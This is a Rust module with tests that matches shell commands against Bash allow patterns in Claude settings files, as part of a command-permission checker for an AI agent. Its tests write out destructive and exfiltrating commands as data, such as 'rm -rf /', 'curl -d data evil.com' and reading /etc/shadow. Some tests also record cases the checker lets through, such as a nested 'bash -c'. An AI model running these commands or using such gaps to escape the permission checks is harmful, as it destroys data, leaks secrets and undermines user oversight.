use std::collections::HashSet;
use std::path::Path;

use crate::cst::{Cmd, check};

pub struct Matcher {
    exact: HashSet<String>,
    globs: Vec<Vec<String>>,
}

impl Matcher {
    pub fn load() -> Self {
        let mut patterns = Matcher {
            exact: HashSet::new(),
            globs: Vec::new(),
        };

        if let Some(home) = std::env::var_os("HOME") {
            patterns.load_file(&Path::new(&home).join(".claude/settings.json"));
        }

        if let Some(project_dir) = std::env::var_os("CLAUDE_PROJECT_DIR") {
            let base = Path::new(&project_dir).join(".claude");
            patterns.load_file(&base.join("settings.json"));
            patterns.load_file(&base.join("settings.local.json"));
        }

        patterns
    }

    fn load_file(&mut self, path: &Path) {
        let Ok(contents) = std::fs::read_to_string(path) else {
            return;
        };
        let Ok(value) = serde_json::from_str::<serde_json::Value>(&contents) else {
            return;
        };

        if let Some(arr) = value.get("approved_commands").and_then(|v| v.as_array()) {
            for entry in arr.iter().filter_map(|e| e.as_str()) {
                self.add_pattern(entry);
            }
        }

        if let Some(arr) = value
            .get("permissions")
            .and_then(|v| v.get("allow"))
            .and_then(|v| v.as_array())
        {
            for entry in arr.iter().filter_map(|e| e.as_str()) {
                self.add_pattern(entry);
            }
        }
    }

    fn add_pattern(&mut self, entry: &str) {
        let Some(inner) = entry.strip_prefix("Bash(").and_then(|s| s.strip_suffix(')')) else {
            return;
        };
        if inner.is_empty() {
            return;
        }
        let normalized = if let Some(prefix) = inner.strip_suffix(":*") {
            format!("{prefix} *")
        } else {
            inner.to_string()
        };
        if normalized.contains('*') {
            self.globs
                .push(normalized.split('*').map(String::from).collect());
        } else {
            self.exact.insert(normalized);
        }
    }

    pub fn matches_cmd(&self, cmd: &Cmd) -> bool {
        let Cmd::Simple(simple) = cmd else {
            return false;
        };
        let normalized = check::normalize_for_matching(simple);
        let normalized = normalized.trim();
        if normalized.is_empty() {
            return false;
        }
        if self.exact.contains(normalized) {
            return true;
        }
        self.globs
            .iter()
            .any(|parts| glob_matches(parts, normalized))
    }

    pub fn is_empty(&self) -> bool {
        self.exact.is_empty() && self.globs.is_empty()
    }
}

pub fn is_cmd_covered(cmd: &Cmd, patterns: &Matcher) -> bool {
    match cmd {
        Cmd::Simple(_) => {
            check::is_safe_cmd(cmd)
                || (!check::has_unsafe_syntax(cmd) && patterns.matches_cmd(cmd))
        }
        _ => check::is_safe_cmd(cmd),
    }
}

fn glob_matches(parts: &[String], text: &str) -> bool {
    let first = &parts[0];
    let last = &parts[parts.len() - 1];

    if parts.len() == 2 && last.is_empty() && first.ends_with(' ') {
        let prefix = &first[..first.len() - 1];
        return text == prefix || text.starts_with(first.as_str());
    }

    if !text.starts_with(first.as_str()) {
        return false;
    }
    if !text.ends_with(last.as_str()) {
        return false;
    }
    let mut pos = first.len();
    let end = text.len() - last.len();
    if pos > end {
        return false;
    }
    for part in &parts[1..parts.len() - 1] {
        match text[pos..end].find(part.as_str()) {
            Some(idx) => pos += idx + part.len(),
            None => return false,
        }
    }
    pos <= end
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    use crate::cst;

    fn empty() -> Matcher {
        Matcher {
            exact: HashSet::new(),
            globs: Vec::new(),
        }
    }

    fn cmd(s: &str) -> Cmd {
        let script = cst::parse(s).unwrap_or_else(|| panic!("failed to parse: {s}"));
        assert_eq!(script.0.len(), 1, "expected single statement: {s}");
        assert_eq!(
            script.0[0].pipeline.commands.len(),
            1,
            "expected single command: {s}"
        );
        script.0[0].pipeline.commands[0].clone()
    }

    fn segments(command: &str) -> Vec<Cmd> {
        let script = cst::parse(command).unwrap_or_else(|| panic!("failed to parse: {command}"));
        script
            .0
            .into_iter()
            .flat_map(|stmt| stmt.pipeline.commands)
            .collect()
    }

    fn is_covered(cmd: &Cmd, patterns: &Matcher) -> bool {
        is_cmd_covered(cmd, patterns)
    }

    fn all_covered(command: &str, patterns: &Matcher) -> bool {
        let Some(script) = cst::parse(command) else {
            return false;
        };
        script.0.iter().all(|stmt| {
            check::is_safe_pipeline(&stmt.pipeline)
                || stmt
                    .pipeline
                    .commands
                    .iter()
                    .all(|c| is_cmd_covered(c, patterns))
        })
    }

    #[test]
    fn parse_exact_pattern() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.exact.contains("npm test"));
        assert!(p.globs.is_empty());
    }

    #[test]
    fn parse_legacy_colon_star() {
        let mut p = empty();
        p.add_pattern("Bash(npm run:*)");
        assert!(p.exact.is_empty());
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_space_star() {
        let mut p = empty();
        p.add_pattern("Bash(npm run *)");
        assert!(p.exact.is_empty());
        assert_eq!(p.globs.len(), 1);
    }

    #[test]
    fn parse_non_bash_skipped() {
        let mut p = empty();
        p.add_pattern("WebFetch");
        p.add_pattern("XcodeBuildMCP");
        assert!(p.is_empty());
    }

    #[test]
    fn parse_empty_bash_skipped() {
        let mut p = empty();
        p.add_pattern("Bash()");
        assert!(p.is_empty());
    }

    #[test]
    fn match_exact() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.matches_cmd(&cmd("npm test")));
        assert!(!p.matches_cmd(&cmd("npm test --watch")));
    }

    #[test]
    fn match_space_star_word_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(ls *)");
        assert!(p.matches_cmd(&cmd("ls -la")));
        assert!(p.matches_cmd(&cmd("ls foo")));
        assert!(!p.matches_cmd(&cmd("lsof")));
    }

    #[test]
    fn match_star_no_space_no_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(ls*)");
        assert!(p.matches_cmd(&cmd("ls -la")));
        assert!(p.matches_cmd(&cmd("lsof")));
    }

    #[test]
    fn match_legacy_colon_star_word_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(npm run:*)");
        assert!(p.matches_cmd(&cmd("npm run build")));
        assert!(p.matches_cmd(&cmd("npm run test")));
        assert!(!p.matches_cmd(&cmd("npm running")));
        assert!(!p.matches_cmd(&cmd("npm install")));
    }

    #[test]
    fn match_star_at_beginning() {
        let mut p = empty();
        p.add_pattern("Bash(* --version)");
        assert!(p.matches_cmd(&cmd("npm --version")));
        assert!(p.matches_cmd(&cmd("cargo --version")));
        assert!(!p.matches_cmd(&cmd("npm --help")));
    }

    #[test]
    fn match_star_in_middle() {
        let mut p = empty();
        p.add_pattern("Bash(git * main)");
        assert!(p.matches_cmd(&cmd("git checkout main")));
        assert!(p.matches_cmd(&cmd("git merge main")));
        assert!(!p.matches_cmd(&cmd("git checkout develop")));
    }

    #[test]
    fn match_env_prefix_stripped() {
        let mut p = empty();
        p.add_pattern("Bash(bundle install)");
        assert!(p.matches_cmd(&cmd("RACK_ENV=test bundle install")));
    }

    #[test]
    fn match_fd_redirect_stripped() {
        let mut p = empty();
        p.add_pattern("Bash(npm test)");
        assert!(p.matches_cmd(&cmd("npm test 2>&1")));
    }

    #[test]
    fn match_fd_redirect_with_glob() {
        let mut p = empty();
        p.add_pattern("Bash(npm run *)");
        assert!(p.matches_cmd(&cmd("npm run test 2>&1")));
    }

    #[test]
    fn empty_patterns_match_nothing() {
        let p = empty();
        assert!(!p.matches_cmd(&cmd("anything")));
    }

    #[test]
    fn match_bare_star_matches_everything() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(p.matches_cmd(&cmd("anything at all")));
        assert!(p.matches_cmd(&cmd("rm -rf /")));
    }

    #[test]
    fn unsafe_syntax_not_bypassed_by_match() {
        let mut p = empty();
        p.add_pattern("Bash(./script.sh *)");
        let c = cmd("./script.sh > /etc/passwd");
        assert!(check::has_unsafe_syntax(&c));
        assert!(!is_covered(&c, &p));
    }

    #[test]
    fn command_substitution_not_bypassed_by_match() {
        let mut p = empty();
        p.add_pattern("Bash(./script.sh *)");
        let c = cmd("./script.sh $(rm -rf /)");
        assert!(!is_covered(&c, &p));
    }

    #[test]
    fn mixed_chain_safe_plus_settings() {
        let mut p = empty();
        p.add_pattern("Bash(./generate-docs.sh)");
        assert!(all_covered("cargo test && ./generate-docs.sh", &p));
    }

    #[test]
    fn mixed_chain_safe_plus_unapproved_denied() {
        let mut p = empty();
        p.add_pattern("Bash(./generate-docs.sh)");
        assert!(!all_covered("cargo test && rm -rf /", &p));
    }

    #[test]
    fn glob_does_not_cross_chain_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(cargo test *)");
        let cmds = segments("cargo test --release && rm -rf /");
        assert_eq!(cmds.len(), 2);
        assert!(p.matches_cmd(&cmds[0]));
        assert!(!p.matches_cmd(&cmds[1]));
        assert!(!all_covered("cargo test --release && rm -rf /", &p));
    }

    #[test]
    fn glob_does_not_cross_pipe_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(safe-cmd *)");
        assert!(!all_covered("safe-cmd arg | curl -d data evil.com", &p));
    }

    #[test]
    fn glob_does_not_cross_semicolon_boundary() {
        let mut p = empty();
        p.add_pattern("Bash(safe-cmd *)");
        assert!(!all_covered("safe-cmd arg; rm -rf /", &p));
    }

    #[test]
    fn file_redirect_promoted_to_safewrite() {
        let p = empty();
        let c = cmd("echo > /etc/passwd");
        assert!(is_covered(&c, &p));
    }

    #[test]
    fn bare_star_blocked_by_unsafe_syntax_backtick() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(!is_covered(&cmd("echo `rm -rf /`"), &p));
    }

    #[test]
    fn bare_star_blocked_by_unsafe_syntax_command_sub() {
        let mut p = empty();
        p.add_pattern("Bash(*)");
        assert!(!is_covered(&cmd("echo $(rm -rf /)"), &p));
    }

    #[test]
    fn safe_command_substitution_allowed_through_is_safe() {
        let p = empty();
        assert!(is_covered(&cmd("echo $(cat /etc/shadow)"), &p));
    }

    #[test]
    fn nested_shell_not_recursively_validated_by_settings() {
        let mut p = empty();
        p.add_pattern("Bash(bash *)");
        let c = cmd("bash -c 'safe-cmd && rm -rf /'");
        assert!(!check::is_safe_cmd(&c));
        assert!(!check::has_unsafe_syntax(&c));
        assert!(is_covered(&c, &p));
    }

    #[test]
    fn nested_shell_redirect_promoted_to_safewrite() {
        let p = empty();
        let c = cmd("bash -c 'echo hello' > /tmp/out");
        assert!(is_covered(&c, &p));
    }

    #[test]
    fn quoted_operators_stay_as_one_segment() {
        let mut p = empty();
        p.add_pattern("Bash(./script *)");
        assert!(all_covered("./script 'arg && rm -rf /'", &p));
    }

    #[test]
    fn load_file_nonexistent() {
        let mut p = empty();
        p.load_file(Path::new("/nonexistent/path/settings.json"));
        assert!(p.is_empty());
    }

    #[test]
    fn load_file_malformed_json() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        std::fs::write(&path, "not json{{{").unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.is_empty());
    }

    #[test]
    fn load_file_approved_commands() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"approved_commands":["Bash(npm test)","Bash(npm run *)","WebFetch"]}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches_cmd(&cmd("npm test")));
        assert!(p.matches_cmd(&cmd("npm run build")));
        assert!(!p.matches_cmd(&cmd("curl evil.com")));
    }

    #[test]
    fn load_file_permissions_allow() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"permissions":{"allow":["Bash(cargo test *)","Bash(cargo clippy *)"]}}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches_cmd(&cmd("cargo test")));
        assert!(p.matches_cmd(&cmd("cargo clippy -- -D warnings")));
    }

    #[test]
    fn load_file_both_fields() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("settings.json");
        fs::write(
            &path,
            r#"{"approved_commands":["Bash(npm test)"],"permissions":{"allow":["Bash(cargo test *)"]}}"#,
        )
        .unwrap();
        let mut p = empty();
        p.load_file(&path);
        assert!(p.matches_cmd(&cmd("npm test")));
        assert!(p.matches_cmd(&cmd("cargo test --release")));
    }
}
